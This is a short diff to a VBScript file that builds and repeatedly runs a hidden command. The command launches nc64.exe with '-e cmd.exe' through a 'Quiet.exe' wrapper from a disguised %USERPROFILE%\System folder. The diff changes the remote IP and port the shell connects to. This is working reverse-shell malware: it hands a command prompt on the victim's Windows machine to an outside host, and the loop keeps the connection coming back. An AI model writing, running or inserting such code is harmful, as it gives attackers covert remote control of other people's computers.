@@ -4,7 +4,7 @@ Set objShell = CreateObject("WScript.Shell")
 customFolder = objShell.ExpandEnvironmentStrings("%USERPROFILE%\System")
 
 ' Define the command to run from the custom folder
-commandToRun = """" & customFolder & "\Quiet.exe"" """ & customFolder & "\nc64.exe"" -e cmd.exe 206.189.80.59 22812"
+commandToRun = """" & customFolder & "\Quiet.exe"" """ & customFolder & "\nc64.exe"" -e cmd.exe 20.197.14.25 443"
 
 ' Loop indefinitely
 Do
